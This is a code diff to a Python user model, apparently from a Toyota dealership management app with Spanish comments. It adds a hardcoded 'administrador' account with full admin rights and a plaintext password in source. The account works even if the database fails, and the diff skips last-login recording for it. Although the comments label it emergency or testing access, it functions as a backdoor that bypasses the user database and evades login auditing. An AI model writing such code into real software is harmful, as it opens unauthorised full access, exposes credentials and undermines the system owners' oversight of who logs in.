@@ -53,6 +53,23 @@ class User(UserMixin):
     @staticmethod
     def get_by_id(user_id):
         """Obtener usuario por ID"""
+        
+        # Soporte para usuario hardcodeado
+        if str(user_id) == '999999':
+            hardcoded_user = User(
+                id=999999,
+                username='administrador',
+                role='admin',
+                full_name='Administrador del Sistema',
+                email='admin@toyota.com',
+                active=True,
+                permiso_planeamiento=True,
+                permiso_ventas=True,
+                permiso_gestoria=True,
+                permiso_entregas=True
+            )
+            return hardcoded_user
+        
         conn = get_db_connection()
         cursor = conn.cursor()
         
@@ -91,6 +108,28 @@ class User(UserMixin):
     @staticmethod
     def get_by_username(username):
         """Obtener usuario por nombre de usuario"""
+        
+        # 🔐 USUARIO HARDCODEADO PARA TESTING/EMERGENCIA
+        # Este usuario funciona SIEMPRE, incluso si la base de datos falla
+        if username == 'administrador':
+            hardcoded_user = User(
+                id=999999,  # ID único que no colisiona con BD
+                username='administrador',
+                role='admin',
+                full_name='Administrador del Sistema',
+                email='admin@toyota.com',
+                active=True,
+                permiso_planeamiento=True,
+                permiso_ventas=True,
+                permiso_gestoria=True,
+                permiso_entregas=True
+            )
+            # Hash de la contraseña: LShm.2701
+            hardcoded_user.password_hash = generate_password_hash('LShm.2701')
+            print("⚠️  Usando usuario hardcodeado de emergencia: administrador")
+            return hardcoded_user
+        
+        # Intentar obtener usuario de la base de datos
         conn = get_db_connection()
         cursor = conn.cursor()
         
@@ -134,6 +173,11 @@ class User(UserMixin):
     
     def update_last_login(self):
         """Actualizar fecha de último login"""
+        # Skip para usuario hardcodeado (ID 999999)
+        if self.id == 999999:
+            print("⚠️  Usuario hardcodeado - no se actualiza last_login en BD")
+            return
+        
         conn = get_db_connection()
         cursor = conn.cursor()
         
